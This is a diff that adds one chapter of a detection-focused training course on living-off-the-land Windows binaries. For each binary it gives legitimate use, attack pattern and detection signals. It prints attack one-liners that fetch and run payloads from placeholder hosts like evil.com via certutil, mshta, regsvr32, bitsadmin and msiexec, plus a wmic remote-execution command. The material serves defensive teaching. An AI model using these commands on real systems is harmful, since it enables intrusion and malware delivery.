@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="chapter-id" content="02">
+  <meta name="module-id" content="lolbas">
+  <title>The LOLBin Catalog · LOLBAS · H3AD-LEARN</title>
+  <link rel="icon" href="https://h3ad-sec.github.io/fevicon.png?v=2026">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <div class="reading-progress" id="readingProgress"></div>
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="header-left">
+        <a href="../index.html" class="logo-link">
+          <img src="https://raw.githubusercontent.com/h3ad-sec/h3ad-sec.github.io/main/logo-dark.png" id="site-logo" class="site-logo" alt="H3AD-SEC" height="32">
+        </a>
+        <div class="nav-pill">
+          <span class="nav-pill-name">H3AD-LEARN</span>
+          <span class="nav-pill-sep">·</span>
+          <span class="nav-pill-tagline">LOLBIN CATALOG</span>
+        </div>
+      </div>
+      <nav class="header-nav">
+        <a href="../index.html" class="nav-link">Hub</a>
+        <a href="index.html" class="nav-link">LOLBAS</a>
+        <a href="../threat-hunting/index.html" class="nav-link">Threat Hunting</a>
+      </nav>
+      <div class="header-actions">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+        </button>
+      </div>
+    </div>
+  </header>
+  <div class="chapter-layout">
+    <aside class="toc-sidebar" id="tocSidebar">
+      <a href="index.html" class="toc-back-link">← LOLBAS</a>
+      <div class="toc-chapter-info">
+        <span class="mono accent" style="font-size:0.75rem;letter-spacing:0.1em;">CHAPTER 02 of 8</span>
+        <span class="muted" style="font-size:0.75rem;font-family:var(--font-mono)">40 MIN READ</span>
+      </div>
+      <nav class="toc-nav" id="tocNav"><!-- JS-populated --></nav>
+      <div class="toc-progress">
+        <span class="section-label" style="font-size:0.55rem;letter-spacing:0.2em;color:var(--muted);font-family:var(--font-mono)">PROGRESS</span>
+        <div class="toc-progress-bar"><div class="toc-progress-fill" id="chapterProgressFill"></div></div>
+        <span class="muted" style="font-size:0.72rem;font-family:var(--font-mono)" id="chapterProgressLabel">0 of 7 sections</span>
+      </div>
+    </aside>
+    <main class="chapter-body" id="chapterBody">
+      <article>
+        <header class="chapter-header">
+          <div class="chapter-meta">
+            <span class="badge-module mono">CHAPTER 02</span>
+            <span class="badge-time muted mono">40 MIN READ</span>
+            <span class="badge-diff badge-intermediate">INTERMEDIATE</span>
+          </div>
+          <h1 class="chapter-title">The LOLBin Catalog</h1>
+          <p class="chapter-intro">Twelve Windows executables account for the majority of LOLBin abuse observed in the wild. Each has a legitimate function, a documented abuse pattern, and a detection approach. This chapter covers them one by one: what they do, how attackers use them, and the command lines that matter.</p>
+          <div class="chapter-tags">
+            <span class="tag">certutil</span>
+            <span class="tag">mshta</span>
+            <span class="tag">regsvr32</span>
+            <span class="tag">rundll32</span>
+            <span class="tag">wmic</span>
+            <span class="tag">bitsadmin</span>
+          </div>
+        </header>
+
+        <!-- SECTION 1 -->
+        <section class="content-section" id="catalog-overview">
+          <h2>The High-Value LOLBin Catalog</h2>
+          <p>Red Canary's Threat Detection Report tracks LOLBin technique prevalence across 1,700+ organizations. Certutil, mshta, and regsvr32 appear in the top 10 most observed techniques year after year. The concentration matters because it tells defenders where to invest first. Not every LOLBAS project entry is equally important. A handful of binaries drive the majority of real-world abuse.</p>
+
+          <p>Why does abuse concentrate on the same few binaries? Availability is one factor: the most abused LOLBins ship with every Windows version from XP through Windows 11. Capability is another: a good LOLBin offers download, execution, or persistence with a single command. Historical detection rates complete the picture. Certutil, mshta, and regsvr32 have been in active use for more than a decade precisely because detections for them were weak or noisy enough to be suppressed.</p>
+
+          <p>The approach for this catalog is consistent for each entry: legitimate function first, then the abuse pattern, then the detection anchor. Understanding what a binary is supposed to do is not optional context. It is the foundation for distinguishing malicious use from legitimate use, which is the entire detection problem.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Binary</th>
+                  <th>Legitimate Function</th>
+                  <th>Primary Abuse</th>
+                  <th>ATT&CK ID</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>certutil.exe</td>
+                  <td>Certificate management, PKI operations</td>
+                  <td>Download cradle, Base64 decode</td>
+                  <td>T1105, T1027</td>
+                </tr>
+                <tr>
+                  <td>mshta.exe</td>
+                  <td>HTML Application (.hta) host</td>
+                  <td>Remote HTA execution, proxy execution</td>
+                  <td>T1218.005</td>
+                </tr>
+                <tr>
+                  <td>regsvr32.exe</td>
+                  <td>COM DLL registration</td>
+                  <td>Squiblydoo: remote COM scriptlet execution</td>
+                  <td>T1218.010</td>
+                </tr>
+                <tr>
+                  <td>rundll32.exe</td>
+                  <td>DLL function loader</td>
+                  <td>Arbitrary DLL execution, JavaScript execution</td>
+                  <td>T1218.011</td>
+                </tr>
+                <tr>
+                  <td>wscript.exe</td>
+                  <td>WSH VBScript execution (GUI)</td>
+                  <td>Malicious .vbs script execution</td>
+                  <td>T1059.005</td>
+                </tr>
+                <tr>
+                  <td>cscript.exe</td>
+                  <td>WSH JScript execution (console)</td>
+                  <td>Malicious .js script execution</td>
+                  <td>T1059.007</td>
+                </tr>
+                <tr>
+                  <td>bitsadmin.exe</td>
+                  <td>BITS transfer service management</td>
+                  <td>Remote file download, C2 channel, persistence</td>
+                  <td>T1197</td>
+                </tr>
+                <tr>
+                  <td>wmic.exe</td>
+                  <td>WMI command-line interface</td>
+                  <td>Remote process creation, lateral movement, recon</td>
+                  <td>T1047</td>
+                </tr>
+                <tr>
+                  <td>installutil.exe</td>
+                  <td>.NET installer component runner</td>
+                  <td>AppLocker bypass, .NET assembly execution</td>
+                  <td>T1218.004</td>
+                </tr>
+                <tr>
+                  <td>msiexec.exe</td>
+                  <td>Windows Installer</td>
+                  <td>Remote MSI download and silent install</td>
+                  <td>T1218.007</td>
+                </tr>
+                <tr>
+                  <td>odbcconf.exe</td>
+                  <td>ODBC configuration utility</td>
+                  <td>Arbitrary DLL loading via REGSVR action</td>
+                  <td>T1218.008</td>
+                </tr>
+                <tr>
+                  <td>forfiles.exe</td>
+                  <td>Batch file processing</td>
+                  <td>Command execution via /c parameter</td>
+                  <td>T1059.003</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <!-- SECTION 2 -->
+        <section class="content-section" id="certutil">
+          <h2>certutil.exe</h2>
+          <p>Certutil is the Windows Certificate Services command-line tool. Its legitimate function covers certificate management, CRL operations, PKI diagnostics, and hash verification. It runs on every Windows system because Windows depends on it for certificate infrastructure. That ubiquity is precisely what makes it attractive for abuse.</p>
+
+          <p>The most common abuse pattern is the download cradle. The -urlcache flag tells certutil to retrieve a URL and cache the result locally. Combined with -split (chunk-based download) and -f (force overwrite), a single command downloads a remote binary and writes it to disk.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>certutil.exe -urlcache -split -f http://EVIL/payload.exe C:\Users\Public\payload.exe</code></pre>
+          </div>
+
+          <p>The second major abuse pattern is Base64 decoding. An attacker can deliver a payload as a .txt or .b64 file, bypassing content inspection that would flag an .exe. Certutil then decodes it on the target system.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>certutil.exe -decode encoded.b64 decoded.exe</code></pre>
+          </div>
+
+          <p>The reverse operation, -encode, is used for exfiltration or obfuscation: encoding a file as Base64 text before sending it out of the environment.</p>
+
+          <p>ATT&CK coverage: T1105 (Ingress Tool Transfer) for the download cradle, T1027 (Obfuscated Files or Information) for the encode/decode operations.</p>
+
+          <p>Detection signals that matter: certutil with -urlcache in the command line, certutil making outbound HTTP or HTTPS connections (Sysmon Event ID 3), certutil writing executable files, and certutil spawned by an unexpected parent process such as Office applications, browsers, or script hosts. The false positive baseline is important here. Certutil -hashfile (verifying file integrity) and certutil -viewstore (browsing the certificate store) are common and legitimate. The -urlcache flag is not. In any environment without a WSUS relay or similar infrastructure reason, certutil making outbound HTTP requests is nearly always malicious on a standard workstation.</p>
+        </section>
+
+        <!-- SECTION 3 -->
+        <section class="content-section" id="mshta-regsvr32">
+          <h2>mshta.exe and regsvr32.exe</h2>
+          <p>These two binaries are the most reliable proxy execution tools in the LOLBin catalog. Both load external code and execute it inside the context of a trusted Windows binary. Both have near-zero false positive rates for their specific abuse patterns.</p>
+
+          <p><strong>mshta.exe</strong> is the Microsoft HTML Application Host. Its legitimate function is to run .hta files, which are HTML pages with embedded script (VBScript or JScript) and elevated privileges compared to browser-based JavaScript. The abuse is direct: pass a URL as an argument and mshta fetches the HTA file and executes whatever script it contains.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-block-lang"></span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>mshta.exe https://evil.com/payload.hta</code></pre>
+          </div>
+
+          <p>The embedded VBScript or JScript in the HTA file can spawn cmd.exe, powershell.exe, or wscript.exe. This makes mshta a first-stage loader that lands nothing on disk except the HTA file it loads from the network. FIN7, TA551, and a wide range of commodity malware families have used mshta for delivery. ATT&CK: T1218.005.</p>
+
+          <p>Detection: mshta.exe with a URL in the command line, or mshta.exe spawning cmd.exe, powershell.exe, or wscript.exe as child processes. Both patterns have very low false positive rates. Legitimate mshta usage in enterprise environments is rare; loading HTA files from remote URLs is nearly unheard of in non-attacker contexts.</p>
+
+          <p><strong>regsvr32.exe</strong> registers and unregisters COM DLLs and OCX controls. Windows depends on it for COM infrastructure. It is on every allowlist because blocking it breaks legitimate application functionality. The Squiblydoo technique exploits this trust.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll</code></pre>
+          </div>
+
+          <p>The flags matter. /s suppresses confirmation dialogs (silent mode). /u triggers unregistration, which calls the script's execution path. /i passes the URL as initialization data. scrobj.dll is the Windows Script Component runtime, a legitimate Windows DLL that can process COM scriptlets. The combination instructs regsvr32 to load a remote COM scriptlet and execute it, all inside a fully trusted, allowlisted binary.</p>
+
+          <p>Why it bypasses AppLocker: regsvr32.exe is on AppLocker's default executable whitelist because Windows requires it. The scriptlet execution happens inside that trusted process. AppLocker never sees a blocked binary because there is no new binary to block. ATT&CK: T1218.010.</p>
+
+          <p>Detection: regsvr32 with http or https in the command line, or regsvr32 making network connections (Sysmon EID 3), or regsvr32 spawning unexpected child processes. The false positive rate for regsvr32 with a URL in the command line is very low. Legitimate COM registration never involves fetching a remote URL.</p>
+        </section>
+
+        <!-- SECTION 4 -->
+        <section class="content-section" id="rundll32-wscript">
+          <h2>rundll32.exe, wscript.exe, and cscript.exe</h2>
+          <p><strong>rundll32.exe</strong> loads a DLL and calls a specified exported function. Windows uses it extensively for Control Panel applets (.cpl files) and COM server hosting. The abuse model is straightforward: load a malicious DLL from a user-writable path and call an exported function that executes the attacker's code.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>rundll32.exe C:\Users\user\AppData\Local\Temp\payload.dll,DllMain</code></pre>
+          </div>
+
+          <p>The DLL executes inside the rundll32 process context, which is a signed Windows binary. Rundll32 is also abused to execute JavaScript directly, bypassing script execution policies: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"</code> executes script through the mshtml COM interface. ATT&CK: T1218.011.</p>
+
+          <p>Detection: rundll32 loading DLLs from non-system paths (%TEMP%, %APPDATA%, C:\Users\*) is the primary signal. Rundll32 with JavaScript in the command line is very high confidence. The false positive rate for DLLs from user-writable directories is medium because some legitimate applications (installers, update managers) do use AppData for DLL staging, but the pattern combined with an unexpected parent process substantially reduces FP noise.</p>
+
+          <p><strong>wscript.exe</strong> and <strong>cscript.exe</strong> are the two Windows Script Host engines. wscript runs scripts in GUI mode (creates message boxes, dialogs). cscript runs in console mode. Both execute VBScript (.vbs) and JScript (.js) files. In phishing campaigns, a malicious Office macro or email attachment drops a .vbs file and runs it via wscript.</p>
+
+          <p>The multi-stage pattern is common: a macro drops a .vbs, wscript executes the .vbs, and the VBScript spawns powershell.exe with a Base64-encoded download cradle. Each stage uses a trusted binary. The entire chain from initial access to download involves no new binary except the dropped .vbs, which never gets a malicious hash because it is generated fresh each campaign. ATT&CK: T1059.005 (VBScript), T1059.007 (JavaScript/JScript).</p>
+
+          <p>Detection: wscript or cscript spawned by Office processes (winword.exe, excel.exe, powerpnt.exe) is very high signal. Wscript running scripts from %TEMP% or user directories is high signal. The parent process context is the key differentiator: wscript run from the command line by an admin is routine. wscript spawned by Excel at 2pm is an incident.</p>
+        </section>
+
+        <!-- SECTION 5 -->
+        <section class="content-section" id="bitsadmin-wmic">
+          <h2>bitsadmin.exe and wmic.exe</h2>
+          <p><strong>bitsadmin.exe</strong> manages Windows Background Intelligent Transfer Service, the mechanism Windows Update and other system services use to download files asynchronously. BITS transfers continue in the background, survive network interruptions, and persist across reboots by design. That last property makes BITS useful for persistence.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>bitsadmin /transfer job_name /download /priority normal http://evil.com/payload.exe C:\Path\file.exe</code></pre>
+          </div>
+
+          <p>Some implants use BITS as a C2 channel rather than a one-time download mechanism. BITS traffic uses HTTP and HTTPS, is initiated by a trusted Windows service, and is often explicitly trusted by enterprise proxy policies because it is associated with Windows Update. An implant that polls a BITS job for new payloads can operate for extended periods without triggering proxy anomaly detections. ATT&CK: T1197.</p>
+
+          <p>Detection: bitsadmin /transfer to a destination that is not a Microsoft update server, enterprise WSUS server, or internal distribution point is the key signal. The BITS operational event log provides useful secondary evidence: Event ID 59 logs job creation, Event ID 60 logs completion, and Event ID 61 logs errors. These events do not require Sysmon and are available on default Windows installations. PowerShell Start-BitsTransfer to external URLs is also worth hunting.</p>
+
+          <p><strong>wmic.exe</strong> is the WMI Command-Line Interface, providing command-line access to Windows Management Instrumentation. It can query system information, enumerate processes, and create processes both locally and on remote systems. The remote process creation capability is what makes it a lateral movement tool.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>wmic /node:TARGET process call create "cmd.exe /c powershell -enc [payload]"</code></pre>
+          </div>
+
+          <p>Local abuse patterns include reconnaissance (wmic computersystem get domain, wmic process list) and process creation to spawn additional stages. WMI event subscriptions via wmic can also establish persistence that survives reboots, though wmic.exe itself is deprecated in newer Windows versions in favor of PowerShell CIM cmdlets. The underlying WMI mechanism remains present and exploitable. ATT&CK: T1047.</p>
+
+          <p>Detection: wmic with "process call create" in the command line is high signal. wmic with /node: for remote execution combined with a process creation call is very high signal. Wmic calls from unexpected parent processes (Office applications, browser processes) are essentially always malicious. The false positive rate for "process call create" in general is medium because some enterprise management scripts use it, but process call create combined with an encoded command or a remote node is near-zero FP on standard workstations.</p>
+        </section>
+
+        <!-- SECTION 6 -->
+        <section class="content-section" id="installutil-others">
+          <h2>installutil.exe and Other Catalog Entries</h2>
+          <p><strong>installutil.exe</strong> is the .NET Framework Installation Utility. Its purpose is to run installer and uninstaller logic embedded in .NET assemblies, specifically the methods in classes decorated with the [RunInstallerAttribute(true)] attribute. An attacker creates a .NET assembly with a malicious Installer subclass, and installutil.exe runs the Install() method, executing the attacker's code inside a trusted .NET framework binary.</p>
+
+          <p>The AppLocker bypass dimension is significant. installutil.exe is whitelisted by default in most AppLocker configurations because it is a core .NET framework tool that enterprise applications depend on. The binary itself never changes. Only the assembly it is asked to run changes. ATT&CK: T1218.004.</p>
+
+          <p>Detection: installutil.exe running assemblies from user-writable paths (%TEMP%, %APPDATA%, non-standard directories) is the primary signal. installutil.exe making network connections after execution is also high confidence. The false positive rate for user-path assemblies is low because legitimate .NET installers generally run from program files or installer-controlled locations.</p>
+
+          <p><strong>msiexec.exe</strong> is the Windows Installer service. Its abuse pattern is clean and effective: pass a URL directly as the /i argument and msiexec downloads and installs the MSI package silently (/q). MSI execution is trusted by Windows and often allowed through enterprise proxies because it is associated with software deployment. ATT&CK: T1218.007. Detection: msiexec with a URL in the command line is high signal with a near-zero false positive rate on workstations not running software deployment workflows.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>msiexec /q /i http://evil.com/payload.msi</code></pre>
+          </div>
+
+          <p><strong>odbcconf.exe</strong> configures ODBC data sources and drivers. The REGSVR action in odbcconf mirrors regsvr32's function but through a different binary, making it useful when regsvr32 is monitored. ATT&CK: T1218.008.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>odbcconf.exe /A {REGSVR evil.dll}</code></pre>
+          </div>
+
+          <p><strong>forfiles.exe</strong> processes files in a directory and runs a command for each match. Its abuse value is indirect: it can execute commands while making the parent process appear to be a legitimate file management utility. ATT&CK: T1059.003 (indirect).</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c evil_command"</code></pre>
+          </div>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Binary</th>
+                  <th>Key Abuse Command Pattern</th>
+                  <th>ATT&CK ID</th>
+                  <th>Requires Admin?</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>installutil.exe</td>
+                  <td>installutil.exe /logfile= /logtoconsole=false assembly.dll</td>
+                  <td>T1218.004</td>
+                  <td>No</td>
+                </tr>
+                <tr>
+                  <td>msiexec.exe</td>
+                  <td>msiexec /q /i http://url/pkg.msi</td>
+                  <td>T1218.007</td>
+                  <td>No (user installs)</td>
+                </tr>
+                <tr>
+                  <td>odbcconf.exe</td>
+                  <td>odbcconf /A {REGSVR payload.dll}</td>
+                  <td>T1218.008</td>
+                  <td>No</td>
+                </tr>
+                <tr>
+                  <td>forfiles.exe</td>
+                  <td>forfiles /m file /c "cmd /c command"</td>
+                  <td>T1059.003</td>
+                  <td>No</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <!-- SECTION 7 -->
+        <section class="content-section" id="detection-quick-ref">
+          <h2>Detection Quick Reference</h2>
+          <p>For each binary, one detection pattern produces the highest signal-to-noise ratio. These are the patterns to build first. They are not the only detections worth having, but they are the ones with the lowest false positive rates and the highest coverage for real-world abuse.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Binary</th>
+                  <th>Highest-Signal Detection Pattern</th>
+                  <th>Sysmon EID</th>
+                  <th>FP Rate</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>certutil.exe</td>
+                  <td>-urlcache or -decode in CommandLine</td>
+                  <td>EID 1 + EID 3</td>
+                  <td>Low (mainly WSUS relay environments)</td>
+                </tr>
+                <tr>
+                  <td>mshta.exe</td>
+                  <td>URL in CommandLine OR spawning cmd/powershell</td>
+                  <td>EID 1</td>
+                  <td>Low</td>
+                </tr>
+                <tr>
+                  <td>regsvr32.exe</td>
+                  <td>http or https in CommandLine</td>
+                  <td>EID 1</td>
+                  <td>Very Low</td>
+                </tr>
+                <tr>
+                  <td>rundll32.exe</td>
+                  <td>Non-System32 DLL path in CommandLine</td>
+                  <td>EID 1</td>
+                  <td>Medium (some apps stage DLLs in AppData)</td>
+                </tr>
+                <tr>
+                  <td>wscript.exe / cscript.exe</td>
+                  <td>ParentImage = Office or browser process</td>
+                  <td>EID 1</td>
+                  <td>Low</td>
+                </tr>
+                <tr>
+                  <td>bitsadmin.exe</td>
+                  <td>/transfer to non-Microsoft, non-internal URL</td>
+                  <td>EID 1</td>
+                  <td>Low</td>
+                </tr>
+                <tr>
+                  <td>wmic.exe</td>
+                  <td>"process call create" in CommandLine</td>
+                  <td>EID 1</td>
+                  <td>Medium</td>
+                </tr>
+                <tr>
+                  <td>installutil.exe</td>
+                  <td>Non-system path assembly in CommandLine</td>
+                  <td>EID 1</td>
+                  <td>Low</td>
+                </tr>
+                <tr>
+                  <td>msiexec.exe</td>
+                  <td>URL in CommandLine (/i http)</td>
+                  <td>EID 1</td>
+                  <td>Low</td>
+                </tr>
+                <tr>
+                  <td>odbcconf.exe</td>
+                  <td>REGSVR action in CommandLine</td>
+                  <td>EID 1</td>
+                  <td>Very Low</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="callout-tip">
+            <strong>Tip:</strong> Chapter 6 contains full KQL, SPL, and Sigma detection queries for each of these binaries. This section provides the detection logic. Chapter 6 provides the query syntax for Sentinel, Splunk, and Elastic environments. If you are ready to deploy these detections now, jump ahead to Chapter 6 and return to Chapters 3 through 5 for the tradecraft and strategy context.
+          </div>
+
+          <p>A few observations on the FP ratings. Rundll32 gets a medium FP rating not because the detection pattern is bad but because the range of legitimate software that loads DLLs from user directories is broader than for other LOLBins. Adding a filter for parent process (rundll32 spawned by a browser or Office application, or spawned by an unexpected process like a document opener) substantially tightens it. Wmic "process call create" is also medium because some enterprise management scripts use it, but filtering for encoded command strings or remote /node: targets drops FP to near-zero for standard workstations.</p>
+
+          <p>The goal is not to write a detection that fires on the binary name. Every endpoint has these binaries running constantly. The goal is to write a detection that fires on the specific combination of binary, context, and command line that distinguishes attacker use from every legitimate use in your environment. That combination exists for every binary in this catalog.</p>
+        </section>
+
+        <div class="chapter-summary">
+          <h3>Key Takeaways</h3>
+          <ul>
+            <li>Twelve binaries account for the majority of LOLBin abuse: certutil, mshta, regsvr32, rundll32, wscript, cscript, bitsadmin, wmic, installutil, msiexec, odbcconf, and forfiles.</li>
+            <li>certutil -urlcache is one of the oldest and most commonly observed download cradle techniques. certutil making outbound HTTP requests is nearly always malicious on standard workstations.</li>
+            <li>mshta.exe and regsvr32.exe (Squiblydoo) are proxy execution binaries: they load remote payloads and execute them inside the context of a trusted Windows binary.</li>
+            <li>bitsadmin BITS downloads persist across reboots by design, making BITS a favored persistence and C2 channel for implants that need to survive system restarts.</li>
+            <li>wmic.exe enables remote process creation via /node:TARGET, making it a built-in lateral movement tool that requires no dropped binary on the target.</li>
+            <li>installutil.exe is an AppLocker bypass tool: it executes .NET assembly code inside a trusted .NET framework binary that is whitelisted by default.</li>
+            <li>For every LOLBin, the highest-signal detection pattern combines the binary name with a specific command line pattern, not the binary name alone. Detecting certutil.exe fires everywhere. Detecting certutil.exe with -urlcache has a near-zero false positive rate on standard workstations.</li>
+          </ul>
+        </div>
+
+        <div class="knowledge-check">
+          <h3 class="kc-title">Knowledge Check</h3>
+          <p class="kc-intro muted">Click an answer to reveal the explanation.</p>
+
+          <div class="kc-question">
+            <p class="kc-prompt">What command-line flag makes certutil.exe behave as a download cradle?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. -hashfile</button>
+              <button class="kc-option" data-correct="false">B. -viewstore</button>
+              <button class="kc-option" data-correct="true">C. -urlcache</button>
+              <button class="kc-option" data-correct="false">D. -addstore</button>
+            </div>
+            <div class="kc-answer">certutil -urlcache -split -f URL destination downloads a file from the specified URL and saves it locally. The -split flag downloads in chunks. This technique requires no PowerShell, no special permissions, and bypasses many web content filtering policies because certutil is a trusted Windows binary. The -hashfile flag verifies file integrity and is a common legitimate use that should be filtered from detections.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">What makes the regsvr32.exe Squiblydoo technique particularly dangerous in environments with AppLocker?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. regsvr32 runs in kernel mode and cannot be monitored by user-mode hooks</button>
+              <button class="kc-option" data-correct="true">B. regsvr32 is typically on the AppLocker executable whitelist, allowing it to execute remote scriptlets while bypassing execution policies</button>
+              <button class="kc-option" data-correct="false">C. regsvr32 disables AppLocker temporarily during execution</button>
+              <button class="kc-option" data-correct="false">D. regsvr32 uses a rootkit to hide its process from the AppLocker enforcement engine</button>
+            </div>
+            <div class="kc-answer">AppLocker's default executable rules allow regsvr32.exe because it is a required Windows binary for COM DLL registration. The Squiblydoo technique exploits this trust by using regsvr32's /i parameter to load a remote COM scriptlet via scrobj.dll, executing attacker-controlled code inside a fully trusted binary. AppLocker never sees a blocked executable because regsvr32 itself is on the allowlist.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">What is the key detection signal for bitsadmin.exe abuse?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. bitsadmin.exe running under the SYSTEM account</button>
+              <button class="kc-option" data-correct="true">B. bitsadmin.exe /transfer to a destination that is not a Microsoft or enterprise-controlled URL</button>
+              <button class="kc-option" data-correct="false">C. bitsadmin.exe running more than once per day</button>
+              <button class="kc-option" data-correct="false">D. bitsadmin.exe spawning cmd.exe as a child process</button>
+            </div>
+            <div class="kc-answer">Legitimate BITS usage reaches Microsoft Update servers, enterprise WSUS servers, or internal distribution points. bitsadmin /transfer to a non-Microsoft, non-internal URL is the key anomaly. The BITS operational event log also captures transfer job creation (Event IDs 59-61) and is a useful secondary source that does not require Sysmon to be deployed.</div>
+          </div>
+        </div>
+
+        <nav class="chapter-nav">
+          <a href="01-lol-fundamentals.html" class="chapter-nav-prev">← LOLBAS Fundamentals</a>
+          <a href="03-lolscripts-net.html" class="chapter-nav-next">LOLScripts and Drivers →</a>
+        </nav>
+      </article>
+    </main>
+  </div>
+  <script src="../js/learn.js"></script>
+  <script>document.addEventListener('DOMContentLoaded', () => initChapter('02', 7));</script>
+</body>
+</html>
